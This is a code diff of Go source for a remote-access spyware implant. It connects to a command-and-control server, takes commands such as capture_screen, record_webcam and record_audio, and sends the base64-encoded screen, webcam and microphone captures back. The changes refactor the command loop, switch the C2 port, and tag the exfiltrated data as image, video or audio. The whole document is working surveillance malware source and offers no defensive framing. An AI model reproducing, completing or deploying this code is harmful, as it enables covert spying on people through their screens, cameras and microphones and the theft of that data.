@@ -20,7 +20,7 @@ import (
 
 const (
 	HOST = "127.0.0.1"
-	PORT = 12345
+	PORT = 54321
 )
 
 func main() {
@@ -87,7 +87,6 @@ func reach_command_and_control() {
 			reach_command_and_control()
 		} else {
 			// communication with C2
-			conn.Write([]byte(video_recording(0, 5)))
 			engage_via(conn)
 		}
 	} else {
@@ -98,40 +97,34 @@ func reach_command_and_control() {
 
 func engage_via(conn net.Conn) {
 	// continually receive commands from c2 and act on them
-
 	for {
-		var msg, cmd, result string
-		msg, _ = bufio.NewReader(conn).ReadString('\n')
-		cmd = strings.TrimSpace(string(msg))
-		conn.Read([]byte(cmd))
+		msg, _ := bufio.NewReader(conn).ReadString('\n')
+		cmd := strings.TrimSpace(string(msg))
 		if cmd == "q" || cmd == "quit" {
-			result = "Closing connection"
+			result := "Closing connection"
 			send_resp(conn, result)
+			conn.Close()
 		} else if cmd == "capture_screen" {
-			result = screen_capture()
+			result := screen_capture()
 			send_resp(conn, result)
 		} else if cmd == "record_screen" {
-			result = video_recording(0, 5)
+			result := video_recording(0, 5)
 			send_resp(conn, result)
 		} else if cmd == "capture_webcam" {
-			result = webcam_snap()
+			result := webcam_snap()
 			send_resp(conn, result)
 		} else if cmd == "record_webcam" {
-			result = video_recording(1, 5)
+			result := video_recording(1, 5)
 			send_resp(conn, result)
 		} else if cmd == "record_audio" {
-			result = mic_record(30)
+			result := mic_record(30)
 			send_resp(conn, result)
 		}
 	}
 }
 
 func send_resp(conn net.Conn, resp string) {
-	if resp == "Closing connection" {
-		fmt.Fprintf(conn, "%s", resp)
-	} else {
-		fmt.Fprintf(conn, "%s# ", resp)
-	}
+	fmt.Fprintf(conn, "%s\n", resp)
 }
 
 func b64_file(file string) string {
@@ -145,7 +138,7 @@ func screen_capture() string {
 	file := "/etc/screen.png"
 	f, _ := os.Create(file)
 	png.Encode(f, img)
-	result := b64_file(file)
+	result := "img:" + b64_file(file)
 
 	return result
 }
@@ -173,7 +166,7 @@ func webcam_snap() string {
 		img := gocv.NewMat()
 		capture.Read(&img)
 		gocv.IMWrite(file, img)
-		result := b64_file(file)
+		result := "img:" + b64_file(file)
 		os.Remove(file)
 		return result
 	} else {
@@ -217,7 +210,7 @@ func video_recording(tgt int, t int) string {
 	}
 
 	capture.Close()
-	result := b64_file(file) 
+	result := "vid:" + b64_file(file)
 	os.Remove(file)
 	return result
 }
@@ -241,7 +234,7 @@ func mic_record(t int) string {
 	}
 	stream.Stop()
 
-	result := b64_file(file)
+	result := "mic:" + b64_file(file)
 	os.Remove(file)
 
 	return result
